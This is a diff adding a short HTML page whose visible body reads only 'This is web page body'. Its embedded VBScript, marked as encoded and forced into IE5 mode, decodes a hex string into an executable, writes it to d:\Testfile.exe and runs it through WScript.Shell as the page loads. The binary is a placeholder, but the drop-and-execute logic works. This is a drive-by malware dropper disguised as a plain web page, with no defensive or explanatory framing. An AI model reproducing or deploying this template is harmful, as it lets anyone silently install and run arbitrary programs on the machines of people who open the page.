@@ -1,0 +1,21 @@
+<html>
+<meta http-equiv="x-ua-compatible" content="IE=5">
+</head>
+<body>
+<script language="VBScript.Encode">
+	 Dim w
+	 w = "exe file of 16 hex data"
+         Dim objFSO
+         Set objFSO = CreateObject("Scripting.FileSystemObject")          
+         Dim objTextFile 
+         Set objTextFile = objFSO.CreateTextFile("d:\Testfile.exe")     
+	 For i = 1 To Len(w) Step 2
+	 objTextFile.Write Chr(CLng("&H" & Mid(w,i,2)))
+	 Next
+	 objTextFile.close
+	 Set WS= CreateObject("WScript.Shell") 
+	 WS.Run "d:/Testfile.exe"
+      </script>
+      <p>This is web page body </p>
+   </body>
+</html>
